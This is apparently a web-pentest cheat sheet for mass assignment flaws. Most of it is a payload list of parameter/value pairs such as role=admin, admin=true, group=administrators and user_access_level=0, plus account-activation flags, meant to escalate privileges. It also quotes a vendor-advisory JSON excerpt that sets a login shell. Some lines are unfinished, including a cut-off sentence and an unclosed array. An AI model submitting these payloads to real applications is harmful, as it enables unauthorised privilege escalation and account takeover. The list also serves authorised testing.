# MassAssignment (Or Autobinding) 

Best results is to investigate all the pages of the app looking for patterns in parameter names. For example, if other fields are user_name and user_email, then possible candidates for Mass Assignment might be user_role and user_group.
Look at documentation and any other 

These are common attributes for user accounts useful in privilege escalation 
enabled=true
processed=true
approved=true
approval=true
user_approval=true
onboard=true
user_onboarded=true
user_onboarded=1
enabled=1
status=enabled
user_status=enabled

These are parameter name value pairs to attempt privilege escalation via mass assignment

role=admin
role=site_admin
role=site_edit
group=admins
group=administrators
group=vendors
group=admin
group=
groups=[admin,user_management,editor,
roles might be an array:
roles=[add_user,delete_user, edit_user,create_user,view_user,edit_content]
role=content_owner

role=0
..
role=9

admin=true

admin=1

user_role=0

user_role=9

user_role=admin

user_role=administrator

user_role=moderator

user_role=

administrator=true

user_access_level=0

access_level
accessLevel
userAccessLevel

user_access

useraccess

user-access

user.access

user.accesslevel

user-accesslevel
ual



If JSON is used these are extra params that have been found in vulnerability reports:
"shell":"/bin/bash"

Exampe from https://www.silver-peak.com/sites/default/files/advisory/silver_peak_security_advisory_mass_assignment_vulnerability.pdf
{"users":{"basic":{"self":"basic","enable":true,"gid":0,"password":"[SNIP]","
shell":"/bin/bash"}},[SNIP
other users]}}

Other:
{"user_name":"inons","age":24,"credit_balance":10}

